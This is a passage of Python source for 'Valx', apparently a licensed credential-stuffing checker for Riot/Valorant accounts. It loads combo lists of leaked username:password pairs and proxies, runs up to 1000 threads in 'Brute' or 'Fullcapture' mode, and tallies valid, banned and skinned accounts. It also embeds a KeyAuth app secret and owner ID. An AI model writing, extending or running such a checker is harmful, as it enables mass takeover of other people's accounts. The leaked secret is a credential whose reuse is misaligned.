        combos.append(combo)
        return

def remain(comboo):
    print(comboo)
    for comboo in xds:
        xds.remove(comboo)
        with open(f"results/{current_date}/remain_accs.txt", "w", encoding="utf-8") as f:
            for line in xds:
                f.write(line + "\n")

def start():
    global combos, gc, startt, valid, invalid, checked, unbanned, banned, no_skins, skinned, num, retry, checked
    os.system("cls")
    print(title)
    getcombos()
    getproxies()

    print(" ? ~ Threads ~ max 1000")
    try:
        threads = int(input(" ~ "))
    except Exception:
        print(" ~ Invalid input ")
        time.sleep(2)
        start()
    if threads > 1000:
        print(f" ~ Maximum thread value is {red}1000{reset}")
        time.sleep(2)
        start()
    os.system("cls")
    startt = time.time()
    threading.Thread(target=cpmrunner, daemon =True).start()
    print(title)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    def enrty(combo):
        asyncio.run(checkacc(combo))
    #loop = asyncio.get_running_loop()
    #tasks = []
    #with concurrent.futures.ThreadPoolExecutor() as executor:
    #    num = int(0)
    #    while num < len(combos):
    #        while len(tasks) >= threads:
    #            tasks = [task for task in tasks if not task.done()]
    #            asyncio.sleep(0.1)
    #        try:
    #            task = loop.run_in_executor(executor, asyncio.run, checkacc(combo))
    #            tasks.append(task)
    #            num += 1
    #        except:
    #            traceback.print_exc()
    num = 0
    while True:
        time.sleep(0.1)
        if threading.active_count() <= int(threads):
            if len(combos) >= num:
                try:
                    num += 1
                    threading.Thread(target=enrty, args=({combos[num]}), daemon =True).start()
                except Exception as e:
                    if (combolen<=checked):
                        with lock:
                            print(f"Checked : {checked} | Valid : {valid} | Invalid : {invalid} | Un/Banned : {unbanned}/{banned}")
                        input()
                    else:
                        num -= 1

def close():
    os.system("cls")
    print(title)
    e = input(" ~ Are u sure u want to exit( y / n ) ")
    if e == "y":
        os._exit()
    elif e == "n":
        main()
    else:
        close()

brute = False

def main():
    global brute
    answer()
    ctypes.windll.kernel32.SetConsoleTitleW(f"Valx | Menu")
    os.system("cls")
    print(title)
    print(f"    1 {red}~{reset} Start checker\n    2 {red}~{reset} Proxy Checker\n\n    x {red}~{reset} EXIT\n")
    c = repr(readchar.readkey())
    if c == "'1'":
        def one():
            global brute
            os.system("cls")
            print(title)
            print(f"    1 {red}~{reset} Brute\n    2 {red}~{reset} Fullcapute\n\n")
            d = repr(readchar.readkey())
            if d == "'1'":
                brute = True
                start()
            elif d == "'2'":
                brute = False
                start()
        one()
    if c == "'2'":
        riotchecker.start()
    elif c == "'x'":
        os._exit()
    else:
        main()

def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest

keyauthapp = api(
    name = "valx",
    ownerid = "uKh7JDDPRN",
    secret = "703dd840ae5f5581f5603e695e569ca9d9953f24d05ad17dec17e7bf3eedce45",
    version = "1.0",
    hash_to_check = getchecksum()
)

def answer():
    ctypes.windll.kernel32.SetConsoleTitleW(f"Valx | Authentication")
    auto = "OFF"
    os.system("cls")
    print(title)
    try:
        print(f"""
        1 {red}~{reset} Login
        2 {red}~{reset} Register

        C {red}~{reset} Clear login.valx
        """)
        # ans = input(f" {red}[~]{reset} Select Option: ")
        ans = repr(readchar.readkey()) 
        if ans == "'1'":
            try:
                if os.stat("valx\\login.valx").st_size != 0:
                    with open("valx\\login.valx", "r+") as e:
                        for line in e.readlines():
                            if line != "":
                                user = line.split(':')[0].replace("\n", "")
                                passwor = line.split(':')[1].replace("\n", "")
                else:
                    user = input(f' {red}~{reset} username: ')
                    passwor = input(f' {red}~{reset} password: ')
                keyauthapp.login(user, passwor)
                with open("valx\\login.valx",'r+') as file:
                    file.truncate(0)
                open("valx\\login.valx", "w+").write(user + ":" + passwor)
            except:
                open("valx\\login.valx", "w+").write("")
                answer()
            time.sleep(0.25)
        elif ans == "'2'":
            user = input(f' {red}~{reset} username: ')
            passwor = input(f' {red}~{reset} password: ')
            license = input(f' {red}~{reset} License: ')
            open("valx\\login.valx", "w+").write(user + ":" + passwor)
            keyauthapp.register(user, passwor, license)
            time.sleep(0.25)
        elif ans == "'c'":
            with open("valx/login.valx",'r+') as file:
                    file.truncate(0)
            os.system('cls')
            print(title)
            answer()
        else:
            print(f"\n {lr}[{reset}~{lr}]{reset} Not Valid Option")
            time.sleep(1)
            os.system('cls')
            print(title)
            answer()
    except Exception as e:
        os._exit(1)

if __name__ == '__main__':
    cProfile.run('main()')